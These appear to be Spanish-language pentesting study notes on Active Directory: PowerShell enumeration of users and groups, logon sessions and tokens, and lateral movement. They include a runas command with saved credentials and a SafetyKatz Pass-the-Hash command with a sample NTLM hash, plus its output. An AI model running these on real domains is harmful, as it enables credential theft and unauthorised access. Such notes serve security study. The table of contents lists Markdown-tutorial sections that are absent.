## Tabla de contenido

- [Enumeración](#Enumeración).
- [*LogonSesssion*](#LogonSesssion).
- [Token](#Token).
- [Movimiento_lateral](#Movimiento_lateral).
- [insertar imágenes](#insertar-imagenes).
- [Insertar enlaces](#insertar-enlaces).
- [Hacer anclaje](#hacer-anclaje).
- [Insertar una línea de código](#insertar-una-linea-de-codigo).
- [Insertar un bloque de código](#insertar-un-bloque-de-codigo).
- [Resaltar el código](#resaltar-el-codigo).
- [Insertar tablas](#insertar-tablas).
- [Otras referencias sobre Markdown](#otras-referencias-sobre-markdown).

# Enumeración
### Listar usuarios locales:
```powershell
Get-LocalUser
Get-WmiObject -Class win32_userprofile | select localpath, SID
```

### Listar usuarios del dominio:
```powershell
Get-ADUser -Filter *
Get-ADUser -Filter * -Server 192.168.1.155
```

### Listar grupos locales
```powershell
Get-LocalGroup
```

### Listar grupos del dominio
```powershell
Get-ADGroup -Filter *
Get-ADGroup -Filter * -Server 192.168.1.155
```
# *LogonSesssion*

Se crea cuando hay una autenticación sea de manera remota o local. Las credenciales siempre se asignan a una *logon session*.

![Ex00](https://github.com/0x04e1/Notas-Directorio-Activo/blob/main/Pic/1.png)

Hay dos tipos:

**(1) Interactivas**: las credenciales se almacenan en memoria (lsass.exe) para *Single Sign-On*.

**(2) No interactivas**: no se almacenan en memoria, solo se envían en la red. Por defecto **no se guardan en memoria**.
Ejmplo:

![Ex01](https://github.com/0x04e1/Notas-Directorio-Activo/blob/main/Pic/2.png)

Nota: aunque el usuario pepe puede consumir el recurso con permisos de lectura y escritura, si estas (credenciales) no se envían de manera explícita para consumir un recurso a través de SSO, no se podrá consumir el recurso.

# *Token*

Estructura de datos con información de seguridad de un usuario, gupos, identificar, etc.

![Ex02](https://github.com/0x04e1/Notas-Directorio-Activo/blob/main/Pic/3.png)

Con ello el sistema operativo, aplica controles de acceso a través de privilegios. Todos los objetos del sistema operativo Windows cuentan con descriptores de seguridad, allí está la lista **DACL** y en ella se especifica quién tiene acceso a los objetos.

![Ex03](https://github.com/0x04e1/Notas-Directorio-Activo/blob/main/Pic/4.png)

# Movimiento_lateral

## *runas*

Con credenciales válidas, es posible crear un proceso actuando como ese usuario.
- Aplica de manera local:
```powershell
runas.exe /user:ffff /savecred cmd.exe
```
- Aplica de manera remota:
```powershell
runas /noprofile /netonly /user:domain\Administrator powershell.exe
```

## *Pass-The-Hash*
1. Se crea una nueva sesión.
2. Se duplica el *token* original.
3. Se referencia la nueva sesión.
4. Se pueaplica al hilo principal o crear nuevo proceso y aplicarlo.

```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:juan /domain:cs.org /ntlm:709d4242de780b1f34c19c78ad1630fd /run:powershell.exe" "exit"
```

Al contar con los paquetes de autenticación *msv1_0* y *kerberos*, es posible acceder el consumo de los servicios a través de NTLM y Kerberos (si el servidor lo soporta).
```powershell
msv1_0   - data copy @ 0000013DED28C5E0 : OK !
kerberos - data copy @ 0000013DECC9C6C8
```
